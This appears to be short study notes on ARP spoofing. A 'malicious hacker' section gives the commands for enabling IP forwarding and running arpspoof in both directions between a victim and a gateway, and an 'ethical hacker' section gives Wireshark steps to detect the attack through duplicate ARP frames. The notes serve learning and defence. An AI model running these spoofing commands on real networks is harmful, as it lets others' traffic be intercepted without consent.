MALICIOUS HACKER
- First, we need to configure the intercept system into the forwarding mode by appending the value 1 into the ip_forward file
````
echo 1 > /proc/sys/net/ipv4/ip_forward
````

````
arpspoof -i eth0 -t ip_addr_victim ip_addr_gateway
````

Now open a second window, AND DO THE OPOSITE

````
arpspoof -i eth0 -t ip_addr_gateway ip_addr_victim
````

ETHICAL HACKER

- Open Wireshark
- Click on edit > preferences > columns  > click the add button > rename it as source MAC address > put the field type Hw src addr (resolved)
- Deselect the time column and the legth column
- Create a new column named Destintation MAC address
- Click on apply button
- You will have to make sure they are selected

To only check ARP you must change the filter to `arp.duplicate-address-frame` and apply it
